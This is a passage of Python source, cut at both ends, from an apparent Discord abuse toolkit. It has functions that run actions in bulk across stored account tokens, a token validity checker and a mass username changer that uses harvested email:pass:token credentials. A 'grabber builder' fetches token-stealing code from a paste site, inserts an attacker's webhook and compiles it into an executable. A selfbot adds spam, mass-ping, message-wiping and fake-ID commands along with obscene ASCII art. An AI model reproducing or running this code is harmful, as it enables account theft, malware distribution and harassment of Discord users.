        time.sleep(1.5) 
        exit()    

    else:
        exit()    

def hypejoiner():
    b = Fore.BLUE
    clear()
    print(f'''\n{w}[{b}01{w}] » {Fore.MAGENTA}Bravery{Fore.RESET}
{w}[{b}02{w}] » {Fore.LIGHTRED_EX}Brilliance{Fore.RESET}
{w}[{b}03{w}] » {Fore.LIGHTCYAN_EX}Balance{Fore.RESET}
{w}[{b}04{w}] » Leave The HypeSquad''')

    house = input(f"\n{w}[{b}CHOICE{w}] » ")

    def hype(token):
        headers = mainHeader(token)

        if house == "1":
            housefinal = '1'

        if house == "2":
            housefinal = '2'

        if house == "3":
            housefinal = '3'

        if house == '4':
            housefinal = None

        if house == '1' or '2' or '3':
            payload = {
                'house_id': housefinal
            }
            rep = requests.post("https://discord.com/api/v9/hypesquad/online", json=payload, headers=headers)
            if rep.status_code == 204:
                print(f'[{Fore.BLUE}>{Fore.RESET}] Joined on » {token}')
            else:
                print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed to join on » {token}')

        if house == '4':
            payload = {
                'house_id': housefinal
            }
            req = requests.delete('https://discord.com/api/v9/hypesquad/online', headers=headers, json=payload)
            if req.status_code == 204:
                print(f'[{Fore.BLUE}>{Fore.RESET}] Left on » {token}')
            else:
                pass

        else:
            pass

    tokens = open('data/tokens.txt', 'r').read().splitlines()
    for token in tokens:
        threading.Thread(target=hype(token)).start()

    time.sleep(1)
    input(f'{w}[{lg}+{w}] » Press ENTER to go back!')
    main()

def tokenchecker():
    clear()
    lock = threading.Lock()
    time.sleep(0)
    def success(text): lock.acquire(); print(f"{Fore.LIGHTBLUE_EX}[VALID] ~/> {Fore.RESET}{text}{Fore.RESET}"); lock.release()
    def invalid(text): lock.acquire(); print(f"{Fore.LIGHTRED_EX}[INVALID] ~/> {Fore.RESET} {text}{Fore.RESET}"); lock.release()

    with open("data/tokens.txt", "r") as f: tokens = f.read().splitlines()
    def save_tokens():
        with open("data/tokens.txt", "w") as f: f.write("")
        for token in tokens:
            with open("data/tokens.txt", "a") as f: f.write(token + "\n")
    def removeDuplicates(file):
        lines_seen = set()
        with open(file, "r+") as f:
            d = f.readlines(); f.seek(0)
            for i in d:
                if i not in lines_seen: f.write(i); lines_seen.add(i)
            f.truncate()
    def check_token(token:str):
        response = requests.get('https://discord.com/api/v9/users/@me/library', headers={"accept": "*/*","accept-encoding": "gzip, deflate, br","accept-language": "en-US,en;q=0.9","authorization": token,"cookie": "__dcfduid=88221810e37411ecb92c839028f4e498; __sdcfduid=88221811e37411ecb92c839028f4e498dc108345b16a69b7966e1b3d33d2182268b3ffd2ef5dfb497aef45ea330267cf; locale=en-US; OptanonConsent=isIABGlobal=false&datestamp=Fri+Jun+03+2022+15%3A36%3A59+GMT-0400+(Eastern+Daylight+Time)&version=6.33.0&hosts=&landingPath=https%3A%2F%2Fdiscord.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1; __stripe_mid=3a915c95-4cf7-4d27-9d85-cfea03f7ce829a88e5; __stripe_sid=b699111a-a911-402d-a08a-c8801eb0f2e8baf912; __cf_bm=nEUsFi1av6PiX4cHH1PEcKFKot6_MslL4UbUxraeXb4-1654285264-0-AU8vy1OnS/uTMTGu2TbqIGYWUreX3IAEpMo++NJZgaaFRNAikwxeV/gxPixQ/DWlUyXaSpKSNP6XweSVG5Mzhn/QPdHU3EmR/pQ5K42/mYQaiRRl6osEVJWMMtli3L5iIA==","referer": "https://discord.com/channels/967617613960187974/981260247807168532","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","sec-gpc": "1","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36","x-discord-locale": "en-US","x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuNjEgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEwMi4wLjUwMDUuNjEiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTMwNDEwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="}, timeout=5)
        if response.status_code == 200: 
            success(f"{token[:52]}==")
            validd = 0
            validd += 1
        else: tokens.remove(token); invalid(f"{token}")
    def check_tokens():
        threads=[]
        for token in tokens:
            try:threads.append(threading.Thread(target=check_token, args=(token,)))
            except Exception as e: pass
        for thread in threads: thread.start()
        for thread in threads: thread.join()
    def start():
        removeDuplicates("data/tokens.txt")
        check_tokens()
        save_tokens()

    start()
    input(f"{w}[{Fore.BLUE}DONE{w}] » All Tokens Have been Checked and Updated.. Press ENTER to go Back!")
    main()

def changename():
    clear()
    with open('data/tokens.txt', 'r') as f:
        tokens = [line.strip() for line in f.readlines()]
    proxies = open('data/proxies.txt', 'r').read().splitlines()
    proxy = random.choice(proxies)
    prox = {
        'http': 'http://' + proxy,
        'https': 'http://' + proxy
    }

    b = Fore.BLUE
    print(f'{w}[{b}INFO{w}] » Tokens must be in email:pass:token format and better use proxies or you get ratelimited very fast!')
    username = input('\x1b[37m[\x1b[34mUSERNAME\x1b[37m] User » ')

    for token in tokens:
        
        tuk = token.split(':')[2].strip()
        headers = {
            'Authorization': token.split(':')[2].strip()
        }

        data = {
            'password': token.split(':')[1].strip(),
            'username': username
        }

        response = requests.patch('https://discord.com/api/v9/users/@me', headers=headers, json=data, proxies=prox)

        if response.status_code == 200:
            print(f'{w}[{b}SUCCESS{w}] » Updated Name on {tuk}')
        else:
            print(f'{w}[{rr}FAILED{w}] » Failed To update name on {tuk}')

    input(f"{w}[{lg}EXIT{w}] » Press ENTER to go back!")     
    main()


def joiner():
    clear()
    b = Fore.BLUE
    SlowPrint(f'{w}[{b}JOINER{w}] » Joiner is a paid version of Bypass ')
    print("\n")
    print(f'{w}[{b}DISCORD{w}] » BYASS#9266')
    input("")
    main()

def grabbingbuilder():
    os.system('pip install pyinstaller')
    import subprocess
    clear()
    b = Fore.BLUE
    SlowPrint(f'{w}[{b}WELCOME{w}] » Welcome To Bypasses Grabber Builder:')
    webhook = input(f'\n\n{w}[{b}WEBHOOK{w}] WBH » ')
    name = input(f'{w}[{b}NAME{w}] File Name » ')
    src = requests.get('https://pastes.io/raw/wupmlwqtyp')
    with open(f'output/{name}.py', 'wb')as grabx:
        grabx.write(src.content)
    with open(f'output/{name}.py', 'r') as file:
        filedata = file.read()

    text_to_replace = 'hook = ""'
    new_text = f'hook = "{webhook}"'
    filedata = filedata.replace(text_to_replace, new_text)

    with open(f'output/{name}.py', 'w') as file:
        file.write(filedata)

    exe = input(f'{w}[{b}OBFUSCATE{w}] Do you want to make {name}.py to an exe y/n » ')
    if exe == "y":
        def create_exe(script_file):
            script_path = os.path.abspath(script_file)
            script_dir = os.path.dirname(script_path)
            subprocess.call([sys.executable, "-m", "PyInstaller", "--onefile", script_path], cwd=script_dir)
        create_exe(f'output/{name}.py')
        input(f"{w}[{lg}FINISHED{w}] File is in output/dist/{name}.exe / Enjoy.")
        main()
    else:
        input(f'{w}[{lg}FINISHED{w}] Check output/{name}.py')
        main()



def selfbot():
    clear()
    with open('config.json', 'r') as f:
        data = json.load(f)
        TOKEN = data.get("selfbot_token")
    b = Fore.BLUE
    CHANNEL_ID = Write.Input('[>] Channel ID: ', culur, interval=0.000)
    PREFIX = Write.Input('[>] Prefix: ', culur, interval=0.000)
    MESSAGES_URL = "https://discordapp.com/api/v8/channels/{channel_id}/messages"
    SEND_MESSAGE_URL = "https://discordapp.com/api/v8/channels/{channel_id}/messages"
    HEADERS = {'Authorization': f'{TOKEN}',
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
               'Origin': 'discord.com',
               'Accept': '*/*',
               'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTAuMC4xNTg3LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE4MDEzNSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
               'Accept-Language': 'de,de-DE;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'}
    clear()
    response4 = requests.get("https://discord.com/api/users/@me/guilds", headers=HEADERS)
    online = requests.get('https://discord.com/channels/@me')

    nsfw = """```
⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀       
⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⣿⣦⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡆⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠇⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⣟⣋⣁⣀⣀⠀
⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
```
    """
    xxx = """```
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢢⣀⡀⠀⠀⢠⣾⣙⣷⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣠⡶⣶⣤⢿⣿⣿⣿⡿⢿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠸⣿⣿⡿⣰⡾⢭⡝⣿⣾⣿⣻⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠙⠿⣿⣟⡓⠋⠀⠹⣿⡿⣿⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠹⣇⣀⠠⠞⠛⠛⠛⠓⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⠁⠀⢀⠀⠀⠀⣀⠀⡘⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢧⠀⢢⣸⡵⣁⠽⠐⠒⠚⠓⠳⡤⠀⠀⠠⠄⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⣧⢀⡨⠋⠁⠀⠀⠀⠀⠀⠀⠘⢆⠀⠀⠀⠀⠉⠢⡀⠀⠀
⠀⠀⠀⠀⠀⠀⢡⠜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡧⡀⠀⠀⠀⠀⠘⠄⠀
⠀⠀⠀⠀⠀⠀⡌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠈⡄
⠀⠀⠀⠀⠀⣰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠃⠀⠀⠀⠀⠀⠀⠀⡅          
⠀⠀⠀⠀⠀⠸⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⢹⡀⠀⠀⠀⠀⠀⠀⠀⡇
⠀⠀⠀⠀⠀⠀⠡⡀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢹⠍⠉⠒⠀⠀⠀⠀⠀⠰⠀
⠀⠀⠀⠀⠀⠀⠀⠘⢄⠀⠀⠀⠀⠀⠀⠀⠀⠆⠀⠀⠀⠀⠀⠀⢀⠐⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢢⠀⠀⢀⣀⢀⣌⡀⠀⠀⠀⣀⠠⠒⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠊⠀⠀⠈⠸⣽⡏⠁⠀⠙⠧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⠄⠒⠠⠀⢠⠛⡔⡤⠐⠀⠙⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⡘⠁⠀⠈⠣⡀⠀⠀⢰⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⡐⠁⠀⠀⠀⠀⠐⠄⠀⠘⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣁⣄⠜⠀⠀⠀⠀⠀⠀⠀⠈⢦⠀⢡⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⣄⢽⠀⠀⠀⠀⠀⠀⠀⠀⢀⣎⠜⣣⣼⠄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⠇⠠⢾⠀⠀⠀⠀⠀⠀⠀⠴⡭⢤⡞⢻⠿⠀⠀⠀⠀```"""

    stfu = """
```S      E   C   P```
```S    T     CK U ```
``` H   T     C   P```
```SH    H  F    U ```
```  UT   E  U   U ```
```SH   T     C    ```
```S U   H  F C   P```
```S  T T E FU K U ```
```SH T TH  F CK  P```
```S UT   E   CK  P```
```SHU  T E FU K U ```
```SHUT THE FUCK UP```
```SH T TH  FU K  P```"""

    sleep = """
```ini
[!] 5 Second Time Started..
```"""
    sleep2 = """
```ini
[✓] Timer Stopped at 5 Seconds..
```"""

    x = f"""
```ansi
[1;31mBypass Selfbot » https://bypasstool.xyz
``````ansi
[1;34m{PREFIX}fakeid • Fake ID
{PREFIX}blowjob • Blowjob Asii Art
{PREFIX}stfu • stfu
{PREFIX}ass • Ass Ascii Art
{PREFIX}timer (seconds) • Sets a Timer
{PREFIX}selfbomb • Troll
{PREFIX}empty • Sends an Empty Message
{PREFIX}massdelete (userid) • Deletes every message an user is sending
{PREFIX}massping (userid) • Masspings An Userid
{PREFIX}changeactivity (activity) • Changes your playing activity
{PREFIX}checktoken • Checks a Discord Token
{PREFIX}spam (word) • Spams a Word
{PREFIX}tokenpart (userid) • Gets the First Token Part off an Userid
{PREFIX}deletwebhook (webhook) • Deletes a Discord Webhook
{PREFIX}nitrosniper • Checks if the Nitrosniper is active
{PREFIX}clear (userid) • Deletes all messages from an userid you can also it it for yourself
{PREFIX}infoid (id) • Gets As much infos as possible off an userid
{PREFIX}createthread (name) • Creates a Channel Thread 
{PREFIX}groupspam (user) • Spams a Group in dms with selected user.
{PREFIX}stressmsg (message) • Set a Stress Message That closes Discord on Sending
{PREFIX}fuckchat (amout) • Emptys The Chat 
{PREFIX}threadspam (amout) • Spams Discord Threads in setted amout
{PREFIX}tokensniper • Checks if the Token Sniper is active
``````ansi
[1;31m© https://bypasstool.xyz```
"""

    lol = '''
███████╗███████╗██╗     ███████╗██████╗  ██████╗ ████████╗
██╔════╝██╔════╝██║     ██╔════╝██╔══██╗██╔═══██╗╚══██╔══╝
███████╗█████╗  ██║     █████╗  ██████╔╝██║   ██║   ██║   
╚════██║██╔══╝  ██║     ██╔══╝  ██╔══██╗██║   ██║   ██║   
███████║███████╗███████╗██║     ██████╔╝╚██████╔╝   ██║   
╚══════╝╚══════╝╚══════╝╚═╝     ╚═════╝  ╚═════╝    ╚═╝   
                                                          '''
    fakeid = """
```
Full Name: Lois Wagner
Birth date: 22.06.1999 - Staatsangehörigkeit: DEUTSCH
Place of Birth: DORTMUND
Date of expiry: 12.06.2024
Color of eyes: BRAUN
Adress: 44145 DORTMUND ROHOLTE 2
Date: 13.06.18
Height: 181cm
Authority: STADT DORTMUND
ID: https://shrtco.de/kadium_daddy
```
    """
    if online.status_code == 200:
        if response4.status_code == 200:
            guilds = len(response4.json())
            Write.Print(Center.XCenter(lol), Colors.blue_to_cyan, interval=0.000)
            print("")
            print(f'{Fore.BLUE}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════')
            print(f'{Fore.BLUE}[>] ACCOUNT-TOKEN : {lg}{TOKEN}')
            print(f'{Fore.BLUE}[>] STATUS : {lg}ACTIVE')
            print(f"{Fore.BLUE}[>] GUILDS : {lg}{str(guilds)}")
            print(f"{Fore.BLUE}[>] NITRO-SNIPER : {lg}ACTIVE ON CHANNELID / ['{CHANNEL_ID}']")
            print(f'{Fore.BLUE}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════')
            print("")

    else:
        exit()
    ALLOWED_USER_ID = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": f"{TOKEN}"})\
              .json()["id"]
    while True:
        def activity(TOKEN, act1):
            ws = websocket.WebSocket()
            actt = 'Idle'
            ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
            gjs = {'name': act1,
                   'type': 0}
            auth = {'op': 2,
                    'd': {'token': TOKEN,
                          'properties': {'$os': sys.platform,
                                         '$browser': 'RTB',
                                         '$device': f"{sys.platform} Device"},
                          'presence': {'game': gjs,
                                       'status': actt,
                                       'since': 0,
                                       'afk': False}},
                    's': None,
                    't': None}
            ws.send(json.dumps(auth))
        text = f"🟩 bypasstool.xyz"
        threading.Thread(target=activity, args=(TOKEN, text)).start()
        response = requests.get(MESSAGES_URL.format(channel_id=CHANNEL_ID), headers=HEADERS)
        data = json.loads(response.text)
        if data[0]["content"] == f"{PREFIX}cmds" and data[0]['author']['id'] == ALLOWED_USER_ID:
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"{x}"
            })
        if data[0]["content"] == f"{PREFIX}fakeid" and data[0]['author']['id'] == ALLOWED_USER_ID:
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"{fakeid}"
            })
        if data[0]["content"] == f"{PREFIX}blowjob" and data[0]['author']['id'] == ALLOWED_USER_ID:
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"{nsfw}"
            })
        if data[0]["content"] == f"{PREFIX}stfu" and data[0]['author']['id'] == ALLOWED_USER_ID:
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"{stfu}"
            })
        if data[0]["content"] == f"{PREFIX}ass" and data[0]['author']['id'] == ALLOWED_USER_ID:
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"{xxx}"
            })
        if data and data[0]["content"].startswith(f"{PREFIX}timer ") and data[0]['author']['id'] == ALLOWED_USER_ID:
            wrds = data[0]["content"].split()
            if len(wrds) >= 2:
                arg35 = wrds[1]
            else:
                arg35 = None
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"```⏱️ Timer Started...```"
            }) 
            time.sleep(int(arg35))
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"```⚡ Timer OVER```"
            }) 
            
        if data[0]["content"] == "!selfbomb" and data[0]['author']['id'] == ALLOWED_USER_ID:     
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"```THIS MESSAGE WILL SELFDESTRUCT IN 5```"
            }) 
            time.sleep(1)
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"```THIS MESSAGE WILL SELFDESTRUCT IN 4```"
            }) 
            time.sleep(1)
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"```THIS MESSAGE WILL SELFDESTRUCT IN 3```"
            }) 
            time.sleep(1)
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"```THIS MESSAGE WILL SELFDESTRUCT IN 2```"
            }) 
            time.sleep(1)
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"```THIS MESSAGE WILL SELFDESTRUCT IN 1```"
            }) 
            time.sleep(1)
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f":bomb:"
            }) 
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f":fire:"
            }) 
        if data[0]["content"] == f"{PREFIX}empty" and data[0]['author']['id'] == ALLOWED_USER_ID:
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"https://media.discordapp.net/attachments/1084075668943413269/1086023633488597092/Transparent.png?width=250&height=250"
            }) 
        if data and data[0]["content"].startswith(f"{PREFIX}massdelete ") and data[0]['author']['id'] == ALLOWED_USER_ID:
            words = data[0]["content"].split()
            if len(words) >= 2:
                arg = words[1]
            else:
                arg = None
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"```{arg} - Cannot Send Messages Anymore 📨```"
            }) 
            while True:
                headers = HEADERS
                channel_id = CHANNEL_ID
                user_id = arg

                response = requests.get(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers)

                if response.ok:
                    messages = response.json()
                    for message in messages:
                        if message['author']['id'] == user_id and message['timestamp'] > data[0]['timestamp']:
                            response = requests.delete(f'https://discord.com/api/v9/channels/{channel_id}/messages/{message["id"]}', headers=headers)
                            if not response.ok:
                                pass
                else:
                    pass
        if data and data[0]["content"].startswith(f"{PREFIX}clear") and data[0]['author']['id'] == ALLOWED_USER_ID:
            words = data[0]["content"].split()
            if len(words) >= 2:
                arg = words[1]
            else:
                arg = None
            while True:
                headers = HEADERS
                channel_id = CHANNEL_ID
                user_id = arg

                response = requests.get(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers)

                if response.ok:
                    messages = response.json()
                    for message in messages:
                        if message['author']['id'] == user_id:
                            response = requests.delete(f'https://discord.com/api/v9/channels/{channel_id}/messages/{message["id"]}', headers=headers)
                            if not response.ok:
                                pass
                else:
                    pass
        if data and data[0]["content"].startswith(f"{PREFIX}massping ") and data[0]['author']['id'] == ALLOWED_USER_ID:
            ping = data[0]["content"].split()
            if len(ping) >= 2:
                arg1 = ping[1]
            else:
                arg1 = None
            
            for i in range(5):
                requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                    "content": f"<@{arg1}>"
                })  
                
        if data and data[0]["content"].startswith(f"{PREFIX}changeactivity") and data[0]['author']['id'] == ALLOWED_USER_ID:
            act15 = data[0]["content"].split()
            if len(act15) >= 2:
                arg3 = act15[1]
            else:
                arg3 = None
            def activity(TOKEN, act1):
                ws = websocket.WebSocket()
                actt = 'Idle'
                ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
                gjs = {'name': act1,
                       'type': 0}
                auth = {'op': 2,
                        'd': {'token': TOKEN,
                              'properties': {'$os': sys.platform,
                                             '$browser': 'RTB',
                                             '$device': f"{sys.platform} Device"},
                              'presence': {'game': gjs,
                                           'status': actt,
                                           'since': 0,
                                           'afk': False}},
                        's': None,
                        't': None}
                ws.send(json.dumps(auth))

            text = arg3
            threading.Thread(target=activity, args=(TOKEN, text)).start()

        if data and data[0]["content"].startswith(f"{PREFIX}checktoken") and data[0]['author']['id'] == ALLOWED_USER_ID:
            tuk = data[0]["content"].split()
            if len(tuk) >= 2:
                arg2 = tuk[1]
            else:
                arg2 = None
            response = requests.get('https://discord.com/api/v9/users/@me/library', headers={"accept": "*/*","accept-encoding": "gzip, deflate, br","accept-language": "en-US,en;q=0.9","authorization": arg2,"cookie": "__dcfduid=88221810e37411ecb92c839028f4e498; __sdcfduid=88221811e37411ecb92c839028f4e498dc108345b16a69b7966e1b3d33d2182268b3ffd2ef5dfb497aef45ea330267cf; locale=en-US; OptanonConsent=isIABGlobal=false&datestamp=Fri+Jun+03+2022+15%3A36%3A59+GMT-0400+(Eastern+Daylight+Time)&version=6.33.0&hosts=&landingPath=https%3A%2F%2Fdiscord.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1; __stripe_mid=3a915c95-4cf7-4d27-9d85-cfea03f7ce829a88e5; __stripe_sid=b699111a-a911-402d-a08a-c8801eb0f2e8baf912; __cf_bm=nEUsFi1av6PiX4cHH1PEcKFKot6_MslL4UbUxraeXb4-1654285264-0-AU8vy1OnS/uTMTGu2TbqIGYWUreX3IAEpMo++NJZgaaFRNAikwxeV/gxPixQ/DWlUyXaSpKSNP6XweSVG5Mzhn/QPdHU3EmR/pQ5K42/mYQaiRRl6osEVJWMMtli3L5iIA==","referer": "https://discord.com/channels/967617613960187974/981260247807168532","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","sec-gpc": "1","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36","x-discord-locale": "en-US","x-super-properties": 